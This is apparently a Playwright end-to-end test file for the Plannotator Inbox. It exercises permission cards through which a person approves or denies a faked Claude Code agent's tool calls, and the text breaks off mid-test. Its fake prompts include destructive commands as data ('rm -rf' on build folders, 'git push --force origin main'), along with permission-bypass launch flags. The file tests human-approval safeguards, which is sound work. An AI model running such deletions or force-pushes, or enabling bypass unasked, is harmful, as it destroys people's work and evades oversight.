import { expect, test, type Browser, type BrowserContext, type Locator, type Page } from '@playwright/test';
import { spawnSync } from 'node:child_process';
import { existsSync, mkdirSync, readdirSync, readFileSync, realpathSync, rmSync, writeFileSync } from 'node:fs';
import { join, resolve } from 'node:path';
import { NO_BROWSER } from '../helpers/no-browser';
import { markTourDecided } from '../helpers/tour-decided';
import { installFakeClaude, type FakeClaude, type FakePermissionPrompt } from '../helpers/fake-claude';
import { inboxScratch, rememberInboxOf, removeInboxScratch, stopScratchInbox } from './inbox-scratch';

const repo = resolve(__dirname, '../..');
const binary = resolve(process.env.PLANNOTATOR_E2E_BINARY ?? join(repo, '.local/plannotator'));
const shots = resolve(process.env.LAUNCH_PR2_SHOTS_DIR ?? join(repo, '.local/proof/launch-pr2'));
const WIDE = { width: 1440, height: 900 };
const PHONE = { width: 390, height: 844 };

const BUILD: FakePermissionPrompt = {
  tool_name: 'Bash',
  tool_input: { command: 'bun run --cwd apps/inbox build', description: 'Build the Inbox bundle' },
  permission_suggestions: [{ type: 'addRules', rules: [{ toolName: 'Bash', ruleContent: 'bun run:*' }], behavior: 'allow', destination: 'localSettings' }],
};
const SESSION_CHOICE = 'Allow bun run for this session';
const RM_DIST: FakePermissionPrompt = { tool_name: 'Bash', tool_input: { command: 'rm -rf apps/inbox/dist' }, safetyCheck: true };
const ASK_TOUCH: FakePermissionPrompt = { tool_name: 'Bash', tool_input: { command: 'touch allowed.txt' }, askRule: true };
const ASK_TOUCH_2: FakePermissionPrompt = { tool_name: 'Bash', tool_input: { command: 'touch second.txt' }, askRule: true };
const RM_BUILD_DIR: FakePermissionPrompt = { tool_name: 'Bash', tool_input: { command: 'rm -rf packages/inbox/build' }, safetyCheck: true };
const CONSENT = { skipDangerousModePermissionPrompt: true };
const NEEDS_CONSENT = "Accept Claude Code's bypass notice once in Terminal to use this. Until then sessions start without it.";

interface World {
  root: string;
  home: string;
  dataDir: string;
  env: Record<string, string>;
  url: string;
  port: number;
  fake: FakeClaude;
  project: string;
  context: BrowserContext;
  page: Page;
  errors: string[];
}
let world: World;

function git(dir: string): string {
  mkdirSync(dir, { recursive: true });
  spawnSync('/usr/bin/git', ['init', '-q'], { cwd: dir, env: { PATH: '/usr/bin:/bin', HOME: world.home, GIT_CONFIG_GLOBAL: '/dev/null', GIT_CONFIG_NOSYSTEM: '1' } });
  return realpathSync(dir);
}

function claudeSettings(extra: Record<string, unknown>): void {
  writeFileSync(join(world.home, '.claude', 'settings.json'), JSON.stringify({ enabledPlugins: { 'plannotator@plannotator': true }, ...extra }));
}

function writeConfig(patch: Record<string, unknown>): void {
  const file = join(world.dataDir, 'config.json');
  const config = existsSync(file) ? (JSON.parse(readFileSync(file, 'utf8')) as Record<string, unknown>) : {};
  writeFileSync(file, JSON.stringify({ ...config, ...patch }));
}

function startInbox(): void {
  const started = spawnSync(binary, ['inbox', '--background'], { env: world.env, encoding: 'utf8', timeout: 60_000 });
  expect(started.status, started.stderr).toBe(0);
  rememberInboxOf(world.dataDir);
  const registry = JSON.parse(readFileSync(join(world.dataDir, 'inbox', 'inbox.json'), 'utf8')) as { port: number };
  world.url = started.stdout.trim();
  world.port = registry.port;
}

async function agentWrites(project: string, session: string, body: string): Promise<void> {
  const response = await fetch(`http://127.0.0.1:${world.port}/mcp`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', Accept: 'application/json, text/event-stream' },
    body: JSON.stringify({ jsonrpc: '2.0', id: 1, method: 'tools/call', params: { name: 'send_message', arguments: { body, project_path: project, agent_session: session, agent_host: 'claude-code' } } }),
  });
  expect(response.status).toBe(200);
}

async function shot(page: Page, name: string, options: { scheme?: 'light' | 'dark' } = {}): Promise<void> {
  mkdirSync(shots, { recursive: true });
  await page.emulateMedia({ colorScheme: options.scheme ?? 'light', reducedMotion: 'reduce' });
  await page.waitForFunction((dark) => document.documentElement.classList.contains('light') !== dark, options.scheme === 'dark', { timeout: 3000 }).catch(() => undefined);
  await page.waitForTimeout(300);
  await page.screenshot({ path: join(shots, `${name}.png`) });
  await page.emulateMedia({ colorScheme: 'light', reducedMotion: 'no-preference' });
}

const dialog = (page: Page) => page.locator('dialog[data-compose]');
const pane = (page: Page) => page.locator('section.ib-pane');
const card = (page: Page) => pane(page).locator('section.pc-card[data-permission]').last();
const record = (page: Page, outcome: string) => pane(page).locator(`[data-perm-record="${outcome}"]`);
const armed = (page: Page) => expect(card(page)).toHaveAttribute('data-perm-armed', '', { timeout: 30_000 });
const watchRunLine = (page: Page) =>
  page.evaluate(() => {
    const seen: string[] = [];
    (window as unknown as { __runLines: string[] }).__runLines = seen;
    const note = () => {
      for (const el of document.querySelectorAll('section.ib-pane [data-run]')) {
        const state = el.getAttribute('data-run')!;
        if (seen.at(-1) !== state) seen.push(state);
      }
    };
    new MutationObserver(note).observe(document.body, { subtree: true, childList: true, attributes: true, attributeFilter: ['data-run'] });
    note();
  });
const runLinesSeen = (page: Page) => page.evaluate(() => (window as unknown as { __runLines: string[] }).__runLines);
const oneLine = (target: Locator) =>
  target.evaluate((el) => {
    const range = document.createRange();
    range.selectNodeContents(el);
    return new Set([...range.getClientRects()].filter((r) => r.width > 0).map((r) => Math.round(r.top))).size === 1;
  });
const fitsCard = (page: Page, selector: string) =>
  card(page).evaluate((c, sel) => {
    const el = c.querySelector<HTMLElement>(sel)!;
    const box = c.getBoundingClientRect();
    const r = el.getBoundingClientRect();
    return { inside: r.right <= box.right + 0.5 && r.left >= box.left - 0.5, unclipped: el.scrollWidth <= el.clientWidth + 1 };
  }, selector);

async function waitFor<T>(what: string, check: () => T | null | undefined | false, timeoutMs = 30_000): Promise<T> {
  const deadline = Date.now() + timeoutMs;
  for (;;) {
    const value = check();
    if (value) return value;
    if (Date.now() > deadline) throw new Error(`timed out waiting for ${what}`);
    await new Promise((r) => setTimeout(r, 100));
  }
}

async function launch(page: Page, words: string): Promise<{ threadId: string; launchId: string }> {
  await page.goto(world.url);
  await page.locator('.ib-side [data-open-compose]').click();
  const d = dialog(page);
  await expect(d).toBeVisible();
  await d.locator('[data-compose-to]').click();
  await d.locator('[data-compose-start="claude-code"]').click();
  await d.getByRole('textbox', { name: 'Message' }).fill(words);
  const answer = page.waitForResponse((r) => r.url().endsWith('/api/inbox/messages') && r.request().method() === 'POST');
  await d.locator('[data-compose-send]').click();
  const body = (await (await answer).json()) as { thread_id: string; launch: { id: string } };
  await expect(d).toHaveCount(0);
  await page.goto(`${world.url}#thread=${body.thread_id}`);
  await page.reload();
  await expect(pane(page).locator('[data-launched]')).toBeVisible();
  return { threadId: body.thread_id, launchId: body.launch.id };
}

type ThreadRead = { serverSession: string; thread: { messages: { id: string; author: { kind: string; session?: string | null }; body: string; reply_to?: string | null; to?: { session: string } | null; delivery?: { session: string } | null }[] }; run?: { state: string } | null };
const readThread = (page: Page, threadId: string) => page.evaluate(async (id) => (await fetch(`/api/inbox/threads/${id}`)).json(), threadId) as Promise<ThreadRead>;
const sessionOf = async (page: Page, threadId: string) => {
  const session = (await readThread(page, threadId)).thread.messages[0]?.to?.session;
  expect(session).toMatch(/^[0-9a-f-]{36}$/);
  return session!;
};

async function answer(page: Page, pick: { choice?: 'Allow once' | 'session' | 'Deny' | 'Auto mode'; reason?: string }): Promise<void> {
  const c = card(page);
  await armed(page);
  if (pick.reason) {
    await c.locator('[data-perm="reason"]').click();
    await c.getByRole('textbox', { name: 'Why you deny this, for Claude' }).fill(pick.reason);
    await c.locator('[data-perm-deny-send]').click();
    return;
  }
  const target = { 'Allow once': '[data-perm="once"]', session: '[data-perm="session"]', Deny: '[data-perm="deny"]', 'Auto mode': '[data-perm-mode="auto"]' }[pick.choice!];
  await c.locator(target).click();
}

test.describe.configure({ mode: 'serial' });

test.beforeAll(async ({ browser }: { browser: Browser }) => {
  expect(existsSync(binary), `build the binary first: ${binary}`).toBe(true);
  if (existsSync(shots)) for (const name of readdirSync(shots)) if (name.endsWith('.png')) rmSync(join(shots, name));
  const root = inboxScratch('plannotator-inbox-launch-perm-e2e-');
  const home = join(root, 'home');
  const bin = join(root, 'bin');
  const dataDir = join(root, 'data');
  for (const dir of [home, bin, dataDir]) mkdirSync(dir, { recursive: true });
  mkdirSync(join(home, '.claude'), { recursive: true });
  writeFileSync(join(home, '.claude', 'settings.json'), JSON.stringify({ enabledPlugins: { 'plannotator@plannotator': true } }));
  const fake = installFakeClaude({ bin, state: join(root, 'fake-claude') });
  world = { root, home, dataDir, env: {}, url: '', port: 0, fake, project: '', context: undefined as never, page: undefined as never, errors: [] };
  markTourDecided(dataDir);
  writeConfig({ inboxLaunch: { enabled: true } });
  world.env = {
    PATH: `${bin}:/usr/bin:/bin`,
    HOME: home,
    SHELL: fake.shell,
    PLANNOTATOR_DATA_DIR: dataDir,
    PLANNOTATOR_BROWSER: NO_BROWSER,
    NO_BROWSER,
    PLANNOTATOR_INBOX_CONNECT: '0',
    PLANNOTATOR_INBOX_TAILSCALE: '0',
    PLANNOTATOR_INBOX_PHONES: '0',
    PLANNOTATOR_INBOX_NOTES: '0',
    PLANNOTATOR_UPDATE_CHECK: '0',
    PLANNOTATOR_RELAY_URL: 'http://127.0.0.1:9',
  };
  startInbox();
  await fetch(`http://127.0.0.1:${world.port}/api/inbox/settings`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ notifications: { dismissed: true } }) });
  world.project = git(join(home, 'plannotator', 'plannotator'));
  await agentWrites(git(join(home, 'workspaces-cli')), 'ses-ws', 'Token refresh fails after the laptop sleeps. I traced it to the clock skew check.');
  await agentWrites(world.project, 'ses-pl', 'Reach agents on a remote machine over SSH: a sketch of the relay.');
  const context = await browser.newContext({ viewport: WIDE, deviceScaleFactor: 2, colorScheme: 'light' });
  const page = await context.newPage();
  page.on('pageerror', (error) => world.errors.push(error.message));
  world.context = context;
  world.page = page;
});

test.afterAll(async () => {
  try {
    world?.fake.stopAll();
    await world?.context?.close();
  } finally {
    await removeInboxScratch();
  }
});

test.afterEach(() => {
  world.fake.configure({ prompts: [], localAnswer: null, hold: false, workMs: 800, body: '', fault: null, refuseAuto: false });
  claudeSettings({});
});

test('allow once: the question in the launch thread, the waiting line and the foot; allow with the tool input only; the agent goes on; never a second turn', async ({ browser }) => {
  const { page, fake } = world;
  fake.configure({ prompts: [BUILD] });
  const { threadId, launchId } = await launch(page, 'The Settings search should match fuzzy, not prefix. Rebuild the Inbox bundle to check the chunk size.');
  const p = pane(page);

  await expect(card(page)).toBeVisible({ timeout: 30_000 });
  const c = card(page);
  await expect(c.locator('.pc-title')).toHaveText('Run a command');
  await expect(c.locator('[data-perm-detail]')).toHaveText('bun run --cwd apps/inbox build');
  await expect(c.locator('.pc-why')).toHaveText('Build the Inbox bundle. Runs in ~/plannotator/plannotator');
  await expect(c.locator('.pc-row button')).toHaveText(['Allow once', SESSION_CHOICE, 'Deny', 'Deny with a reason']);
  await expect(c.locator('.pc-modes').first()).toContainText('Or allow this and switch the session to');
  await expect(c.locator('[data-run="waiting_answer"]')).toContainText(/Claude Code is waiting for your permission(?! · \d)/, { timeout: 15_000 });
  await expect(p.locator('[data-run]')).toHaveCount(1);
  await expect(p.locator('[data-run="waiting_answer"] [data-run-stop]')).toBeVisible();
  await expect(p.locator('[data-open-questions]')).toContainText('1 permission waiting');
  await page.reload();
  await expect(card(page)).toBeVisible();
  await expect(page.locator(`button[data-thread-id="${threadId}"]`)).toHaveAttribute('data-section', 'stopped');
  const read = await readThread(page, threadId);
  const question = read.thread.messages.find((m) => m.author.session?.startsWith('perm:'))!;
  expect(question).toBeTruthy();
  expect(read.run?.state).toBe('waiting_answer');
  await shot(page, 'permission-waiting');
  await shot(page, 'permission-waiting-dark', { scheme: 'dark' });

  const phone = await browser.newContext({ viewport: PHONE, deviceScaleFactor: 3, isMobile: true, hasTouch: true, colorScheme: 'light' });
  try {
    const mobile = await phone.newPage();
    await mobile.goto(`${world.url}#thread=${threadId}`);
    await expect(card(mobile)).toBeVisible();
    await expect(card(mobile).locator('[data-run="waiting_answer"]')).toBeVisible();
    await card(mobile).scrollIntoViewIfNeeded();
    await shot(mobile, 'permission-waiting-phone');
    await shot(mobile, 'permission-waiting-phone-dark', { scheme: 'dark' });
  } finally {
    await phone.close();
  }

  await answer(page, { choice: 'Allow once' });
  const [result] = await waitFor('the prompt decided', () => (fake.permissions().length > 0 ? fake.permissions() : null));
  expect(result!.outcome).toBe('ran');
  expect(result!.exitCode).toBe(0);
  expect(result!.output).toEqual({ hookSpecificOutput: { hookEventName: 'PermissionRequest', decision: { behavior: 'allow', updatedInput: BUILD.tool_input } } });
  await expect(p.locator('article.ib-message[data-author="agent"]').last()).toContainText('[Bash ran]', { timeout: 30_000 });
  await expect(p.locator('[data-run]')).toHaveCount(0, { timeout: 30_000 });
  await expect(card(page)).toHaveCount(0);
  await expect(record(page, 'once')).toContainText('You chose Allow once');
  await expect(record(page, 'once')).toContainText('bun run --cwd apps/inbox build');
  await expect(p.locator('article.ib-message[data-author="person"]')).toHaveCount(1);
  await shot(page, 'permission-answered');
  await p.locator('[data-thread-more]').click();
  await expect(page.locator('[data-thread-menu] [data-launch-item]')).toHaveText(['Copy attach command', 'Stop Claude Code', 'Delete Claude Code session…']);
  await page.keyboard.press('Escape');
  const after = await readThread(page, threadId);
  const reply = after.thread.messages.find((m) => m.author.kind === 'person' && m.reply_to === question.id)!;
  expect(reply.delivery?.session).toBe(question.author.session);
  expect(fake.delivered()).not.toContain(reply.id);
  expect(fake.delivered()).toEqual([threadId]);
  expect(launchId).toMatch(/^lch_/);
  expect(world.errors).toEqual([]);
});

test('allow for this session: allow with the update for this session (never the person\'s settings files)', async () => {
  const { page, fake } = world;
  const before = fake.permissions().length;
  fake.configure({ prompts: [BUILD] });
  await launch(page, 'Run the Inbox build again after the scorer change.');
  await expect(card(page)).toBeVisible({ timeout: 30_000 });
  await answer(page, { choice: 'session' });
  const result = await waitFor('the prompt decided', () => fake.permissions()[before]);
  expect(result.outcome).toBe('ran');
  expect(result.output?.hookSpecificOutput?.decision).toEqual({
    behavior: 'allow',
    updatedInput: BUILD.tool_input,
    updatedPermissions: [{ type: 'addRules', rules: [{ toolName: 'Bash', ruleContent: 'bun run:*' }], behavior: 'allow', destination: 'session' }],
  });
});

test('deny with a reason: deny, the reason carried, and the agent goes on without the tool', async () => {
  const { page, fake } = world;
  const before = fake.permissions().length;
  fake.configure({ prompts: [{ tool_name: 'Bash', tool_input: { command: 'git push --force origin main' } }] });
  await launch(page, 'Ship the scorer change.');
  await expect(card(page)).toBeVisible({ timeout: 30_000 });
  await expect(card(page).locator('.pc-row button')).toHaveText(['Allow once', 'Deny', 'Deny with a reason']);
  await answer(page, { reason: 'Never force-push main. Open a pull request instead.' });
  const result = await waitFor('the prompt decided', () => fake.permissions()[before]);
  expect(result.outcome).toBe('denied');
  const decision = result.output?.hookSpecificOutput?.decision;
  expect(decision?.behavior).toBe('deny');
  expect(decision?.message).toContain('Do not retry it');
  expect(decision?.message).toContain('Their reason: Never force-push main. Open a pull request instead.');
  await expect(pane(page).locator('article.ib-message[data-author="agent"]').last()).toContainText('[Bash denied]', { timeout: 30_000 });
  await expect(record(page, 'deny').last()).toContainText('You said: “Never force-push main. Open a pull request instead.”');
});

test('answered in Terminal: the hook is ended, and the question is withdrawn and can no longer be answered', async () => {
  const { page, fake } = world;
  const hooksBefore = fake.hooks().length;
  fake.configure({ prompts: [BUILD] });
  const { threadId } = await launch(page, 'Rebuild once more.');
  await expect(card(page)).toBeVisible({ timeout: 30_000 });
  await expect(pane(page).locator('[data-run="waiting_answer"]')).toBeVisible({ timeout: 15_000 });
  fake.configure({ localAnswer: await sessionOf(page, threadId) });
  const ended = await waitFor('the hook ended', () => fake.hooks()[hooksBefore]);
  expect(ended.local).toBe(true);
  expect(ended.stdout).toBe('');
  await expect(record(page, 'withdrawn')).toContainText('Answered in Terminal', { timeout: 45_000 });
  await expect(card(page)).toHaveCount(0);
  await expect(pane(page).locator('[data-perm]')).toHaveCount(0);
  await expect(pane(page).locator('[data-run="waiting_answer"]')).toHaveCount(0);
  const read = await readThread(page, threadId);
  expect(read.run?.state).not.toBe('waiting_answer');
  await shot(page, 'permission-withdrawn');
  await shot(page, 'permission-withdrawn-dark', { scheme: 'dark' });
});

test('Stop while waiting: the question is withdrawn at once', async () => {
  const { page, fake } = world;
  fake.configure({ prompts: [BUILD] });
  await launch(page, 'Try the build with the new flag.');
  await expect(card(page)).toBeVisible({ timeout: 30_000 });
  const line = pane(page).locator('[data-run="waiting_answer"]');
  await expect(line).toBeVisible({ timeout: 15_000 });
  await line.locator('[data-run-stop]').click();
  await expect(record(page, 'withdrawn')).toContainText('No longer waiting', { timeout: 10_000 });
  await expect(card(page)).toHaveCount(0);
  await expect(pane(page).locator('[data-run="stopped"]')).toBeVisible();
});

test('the Inbox stops mid-wait and starts again: the hook keeps waiting, and the answer after the restart decides', async () => {
  const { fake } = world;
  const before = fake.permissions().length;
  const hooksBefore = fake.hooks().length;
  fake.configure({ prompts: [BUILD] });
  const { threadId } = await launch(world.page, 'Rebuild after the restart.');
  await expect(card(world.page)).toBeVisible({ timeout: 30_000 });
  await world.context.close();
  await stopScratchInbox(world.dataDir);
  await new Promise((r) => setTimeout(r, 7_000));
  expect(fake.hooks().length).toBe(hooksBefore);
  startInbox();
  const context = await world.page.context().browser()!.newContext({ viewport: WIDE, deviceScaleFactor: 2, colorScheme: 'light' });
  const page = await context.newPage();
  page.on('pageerror', (error) => world.errors.push(error.message));
  world.context = context;
  world.page = page;
  await page.goto(`${world.url}#thread=${threadId}`);
  await expect(card(page)).toBeVisible({ timeout: 30_000 });
  await page.waitForTimeout(3_000);
  const read = await readThread(page, threadId);
  expect(read.thread.messages.filter((m) => m.author.session?.startsWith('perm:'))).toHaveLength(1);
  await answer(page, { choice: 'Allow once' });
  const result = await waitFor('the prompt decided', () => fake.permissions()[before]);
  expect(result.outcome).toBe('ran');
});

test('ExitPlanMode: the hook prints nothing at once and no question appears; plan review keeps it', async () => {
  const { page, fake } = world;
  const hooksBefore = fake.hooks().length;
  fake.configure({ prompts: [{ tool_name: 'ExitPlanMode', tool_input: { plan: '# Plan\n\n1. Make the scorer fuzzy.' } }] });
  const { threadId, launchId } = await launch(page, 'Plan the scorer change first.');
  const ran = await waitFor('the hook ran', () => fake.hooks()[hooksBefore]);
  expect(ran.tool).toBe('ExitPlanMode');
  expect(ran.stdout).toBe('');
  expect(ran.exitCode).toBe(0);
  expect(ran.ms).toBeLessThan(5_000);
  const start = fake.starts().find((c) => c.settings?.env?.PLANNOTATOR_LAUNCH === launchId)!;
  const hooks = (start.settings as { hooks?: { PermissionRequest?: { matcher: string; hooks: { command: string; timeout: number }[] }[] } }).hooks!;
  expect(hooks.PermissionRequest).toHaveLength(1);
  expect(hooks.PermissionRequest![0]!.matcher).toBe('*');
  expect(hooks.PermissionRequest![0]!.hooks[0]!.command).toMatch(/ inbox permission-hook$/);
  expect(hooks.PermissionRequest![0]!.hooks[0]!.timeout).toBe(345_600);
  await page.waitForTimeout(2_000);
  const read = await readThread(page, threadId);
  expect(read.thread.messages.some((m) => m.author.session?.startsWith('perm:'))).toBe(false);
  await expect(pane(page).locator('[data-permission]')).toHaveCount(0);
  fake.configure({ localAnswer: await sessionOf(page, threadId) });
  expect(world.errors).toEqual([]);
});

test('only the window answers: a local call with no page Origin is refused, and nothing is decided', async () => {
  const { page, fake } = world;
  const before = fake.permissions().length;
  fake.configure({ prompts: [BUILD] });
  const { threadId } = await launch(page, 'One more build.');
  await expect(card(page)).toBeVisible({ timeout: 30_000 });
  const read = await readThread(page, threadId);
  const question = read.thread.messages.find((m) => m.author.session?.startsWith('perm:'))! as { id: string; questions?: { key: string; revision: number; prompt: string }[] };
  const q = question.questions![0]!;
  const session = read.serverSession;
  const pick = { key: q.key, revision: q.revision, answer: { v: 1, key: q.key, kind: 'single', prompt: q.prompt, selected: ['Allow once'] } };
  const refused = await fetch(`http://127.0.0.1:${world.port}/api/inbox/messages/${question.id}/reply`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ serverSession: session, idempotency_key: 'curl-1', words: '', questions: [pick] }),
  });
  expect(refused.status).toBe(403);
  expect(((await refused.json()) as { code: string }).code).toBe('window_only');
  await page.waitForTimeout(1_000);
  expect(fake.permissions().length).toBe(before);
  await answer(page, { choice: 'Deny' });
  const result = await waitFor('the prompt decided', () => fake.permissions()[before]);
  expect(result.outcome).toBe('denied');
});

test('launch turned off while a question waits: the switch governs new starts only, so the card stays and its answer still reaches the agent', async () => {
  const { page, fake } = world;
  fake.configure({ prompts: [BUILD] });
  const { threadId } = await launch(page, 'A build before the switch goes off.');
  await expect(card(page)).toBeVisible({ timeout: 30_000 });
  const read = await readThread(page, threadId);
  const question = read.thread.messages.find((m) => m.author.session?.startsWith('perm:'))!;
  const before = fake.permissions().length;
  writeConfig({ inboxLaunch: { enabled: false } });
  try {
    await page.waitForTimeout(4_000);
    const now = await readThread(page, threadId);
    expect((now.thread.messages.find((m) => m.id === question.id) as { questions?: { state: string }[] } | undefined)?.questions?.[0]?.state).not.toBe('superseded');
    await page.reload();
    await expect(card(page)).toBeVisible({ timeout: 15_000 });
    await answer(page, { choice: 'Deny' });
    const result = await waitFor('the prompt decided with the switch off', () => fake.permissions()[before]);
    expect(result.outcome).toBe('denied');
  } finally {
    writeConfig({ inboxLaunch: { enabled: true } });
  }
});

const FUZZY = [
  '/** Fuzzy match for the Settings search: every query letter, in order, anywhere in the label. */',
  'export function fuzzyScore(query: string, label: string): number | null {',
  '  const q = query.toLowerCase();',
  '  const l = label.toLowerCase();',
  '  let at = 0;',
  '  let score = 0;',
  '  let run = 0;',
  '  for (const ch of q) {',
  '    const found = l.indexOf(ch, at);',
  '    if (found === -1) return null;',
  '    run = found === at ? run + 1 : 0;',
  '    score += 1 + run;',
  '    at = found + 1;',
  '  }',
  '  return score;',
  '}',
  '',
  '/** The labels that match, best first. */',
  'export function fuzzyFilter<T>(items: T[], query: string, label: (item: T) => string): T[] {',
  '  if (!query.trim()) return items;',
  '  return items',
  '    .map((item) => ({ item, score: fuzzyScore(query, label(item)) }))',
  '    .filter((x): x is { item: T; score: number } => x.score !== null)',
  '    .sort((a, b) => b.score - a.score)',
  '    .map((x) => x.item);',
  '}',
].join('\n');

test('the approved card: Write by Allow once (Enter), Bash by its session rule, WebFetch denied with a reason, Edit allowed with a switch to Auto mode', async ({ browser }) => {
  const { page, fake } = world;
  const before = fake.permissions().length;
  const write: FakePermissionPrompt = {
    tool_name: 'Write',
    tool_input: { file_path: `${world.project}/packages/inbox/search/fuzzy.ts`, content: `${FUZZY}\n` },
    permission_suggestions: [{ type: 'setMode', mode: 'acceptEdits', destination: 'session' }],
  };
  const fetchPage: FakePermissionPrompt = {
    tool_name: 'WebFetch',
    tool_input: { url: 'https://bun.sh/docs/bundler#splitting', prompt: 'How does Bun split chunks, and can a chunk be capped by size?' },
    permission_suggestions: [{ type: 'addRules', rules: [{ toolName: 'WebFetch', ruleContent: 'domain:bun.sh' }], behavior: 'allow', destination: 'localSettings' }],
  };
  const edit: FakePermissionPrompt = {
    tool_name: 'Edit',
    tool_input: {
      file_path: `${world.project}/packages/inbox/components/Settings.tsx`,
      old_string: "const shown = items.filter((s) => s.label.toLowerCase().startsWith(query));",
      new_string: "const shown = fuzzyFilter(items, query, (s) => s.label);",
    },
    permission_suggestions: [{ type: 'setMode', mode: 'acceptEdits', destination: 'session' }],
  };
  fake.configure({
    prompts: [BUILD, write, fetchPage, edit],
    body: 'Settings search now matches fuzzy. I added `packages/inbox/search/fuzzy.ts` and wired it into the palette, so “ntf” finds Notifications.\n\nThe bundle builds. The search chunk grew from 38 KB to 41 KB. I skipped the Bun docs, as you asked.',
  });
  await launch(page, 'The Settings search should match fuzzy, not prefix. Rebuild the Inbox bundle to check the chunk size.');
  const p = pane(page);
  const decision = (i: number) => waitFor(`prompt ${i + 1} decided`, () => fake.permissions()[before + i]).then((r) => r.output?.hookSpecificOutput?.decision);

  await expect(card(page).locator('.pc-title')).toHaveText('Run a command', { timeout: 30_000 });
  await answer(page, { choice: 'session' });
  expect(await decision(0)).toEqual({
    behavior: 'allow',
    updatedInput: BUILD.tool_input,
    updatedPermissions: [{ type: 'addRules', rules: [{ toolName: 'Bash', ruleContent: 'bun run:*' }], behavior: 'allow', destination: 'session' }],
  });
  await expect(record(page, 'session')).toContainText('You chose Allow bun run for this session');

  const c = card(page);
  await expect(c.locator('.pc-title')).toHaveText('Create a file', { timeout: 30_000 });
  await expect(c.locator('.pc-file-head')).toContainText('packages/inbox/search/fuzzy.ts');
  await expect(c.locator('.pc-facts')).toHaveText('New file, 26 lines');
  await expect(c.locator('.pc-line')).toHaveCount(10);
  await expect(c.locator('.pc-more')).toHaveText('Show 16 more lines');
  await expect(c.locator('[data-perm="session"]')).toHaveText('Allow file edits for this session');
  await expect(c.locator('[data-perm="once"]')).toBeFocused();
  await page.mouse.move(0, 0);
  await shot(page, 'light');
  await shot(page, 'dark', { scheme: 'dark' });
  await armed(page);
  await page.keyboard.press('Enter');
  expect(await decision(1)).toEqual({ behavior: 'allow', updatedInput: write.tool_input });
  await expect(record(page, 'once')).toContainText('You chose Allow once');
  await expect(record(page, 'once')).toContainText('packages/inbox/search/fuzzy.ts');

  await expect(card(page).locator('[data-perm-url]')).toHaveText('https://bun.sh/docs/bundler#splitting', { timeout: 30_000 });
  await expect(card(page).locator('.pc-why')).toHaveText('Looking for: How does Bun split chunks, and can a chunk be capped by size?');
  await expect(card(page).locator('[data-perm="session"]')).toHaveText('Allow pages on bun.sh for this session');
  const phone = await browser.newContext({ viewport: PHONE, deviceScaleFactor: 3, isMobile: true, hasTouch: true, colorScheme: 'light' });
  try {
    const mobile = await phone.newPage();
    await mobile.goto(page.url());
    await expect(card(mobile).locator('[data-perm-url]')).toBeVisible();
    const verdict = record(mobile, 'once').last().locator('.pc-rec-verb');
    await expect(verdict).toHaveText('You chose Allow once');
    expect(await oneLine(verdict)).toBe(true);
    const status = card(mobile).locator('.pc-head .pc-sub');
    await expect(status).toHaveText(/^waiting( · \d+ min)?$/);
    expect(await oneLine(status)).toBe(true);
    await card(mobile).locator('.pc-modes').first().scrollIntoViewIfNeeded();
    await shot(mobile, 'phone');
  } finally {
    await phone.close();
  }
  await answer(page, { reason: 'No need, the chunk size is fine. Skip the docs and finish.' });
  const denied = await decision(2);
  expect(denied?.behavior).toBe('deny');
  expect(denied?.message).toContain('Their reason: No need, the chunk size is fine. Skip the docs and finish.');
  await expect(record(page, 'deny')).toContainText('You said: “No need, the chunk size is fine. Skip the docs and finish.”');

  await expect(card(page).locator('.pc-facts')).toHaveText('1 removed, 1 added', { timeout: 30_000 });
  await expect(card(page).locator('[data-perm-mode="auto"]')).toBeVisible();
  await expect(card(page).locator('[data-perm-mode="full"]')).toHaveCount(0);
  await answer(page, { choice: 'Auto mode' });
  expect(await decision(3)).toEqual({
    behavior: 'allow',
    updatedInput: edit.tool_input,
    updatedPermissions: [{ type: 'setMode', mode: 'auto', destination: 'session' }],
  });
  await expect(record(page, 'auto')).toContainText('You chose Allow and switch to Auto mode');

  await expect(p.locator('article.ib-message[data-author="agent"]').last()).toContainText('Settings search now matches fuzzy', { timeout: 30_000 });
  await expect(p.locator('[data-perm-record]')).toHaveCount(4);
  await expect(p.locator('article.ib-message[data-author="person"]')).toHaveCount(1);
  await page.mouse.move(0, 0);
  await shot(page, 'after-answer');
  expect(world.errors).toEqual([]);
});

test('Full permissions, with the person\'s bypass consent: the launch record decides the start (Try again after the switch went off still starts in bypass); a full launch asks nothing but a safety check, which comes to the card; in an auto-mode launch the card asks to confirm the first time, then allows and switches', async ({ browser }) => {
  const { page, fake } = world;
  claudeSettings(CONSENT);
  const phone = await browser.newContext({ viewport: PHONE, deviceScaleFactor: 3, isMobile: true, hasTouch: true, colorScheme: 'light' });
  writeConfig({ inboxLaunch: { enabled: true, fullPermissions: true } });
  try {
    fake.configure({ fault: 'untrusted' });
    const { threadId } = await launch(page, 'Run the Inbox tests once the build is green.');
    await expect(pane(page).locator('[data-run="failed"]')).toBeVisible({ timeout: 30_000 });
    const starts = fake.starts().length;
    const asked = fake.permissions().length;
    writeConfig({ inboxLaunch: { enabled: true, fullPermissions: false } });
    fake.configure({ fault: null, prompts: [BUILD, RM_DIST, RM_BUILD_DIR] });
    await pane(page).locator('[data-run="failed"] [data-run-retry]').click();
    const started = await waitFor('the start after Try again', () => fake.starts()[starts]);
    expect(started.argv.slice(-3)).toEqual(['--allow-dangerously-skip-permissions', '--permission-mode', 'bypassPermissions']);
    expect(started.settings?.env?.CLAUDE_CODE_EVEN_MORE_DANGEROUSLY_SKIP_PERMISSIONS).toBeUndefined();
    expect(started.settings?.hooks?.PermissionRequest).toBeDefined();
    expect(started.settings?.env?.PLANNOTATOR_LAUNCH_FULL_PERMISSIONS).toBeUndefined();
    expect(started.settings?.permissions).toEqual({ allow: ['mcp__plannotator__plannotator_inbox', expect.stringContaining('/inbox/uploads/**')] });
    expect(await waitFor('the build run', () => fake.permissions()[asked])).toMatchObject({ outcome: 'ran', asked: false });
    const c = card(page);
    await expect(c.locator('[data-perm-detail]')).toHaveText('rm -rf apps/inbox/dist', { timeout: 30_000 });
    await expect(c.locator('.pc-head .pc-sub')).toHaveText('is waiting on a safety check');
    await expect(c.locator('.pc-row button')).toHaveText(['Deny', 'Deny with a reason', 'Approve in Terminal']);
    await expect(c.locator('[data-perm-mode], [data-perm="once"]')).toHaveCount(0);
    await expect(c.locator('[data-perm-note]')).toHaveText('Claude Code only accepts this approval in Terminal.');
    await page.mouse.move(0, 0);
    await shot(page, 'full-launch-safety-check');
    const mobile = await phone.newPage();
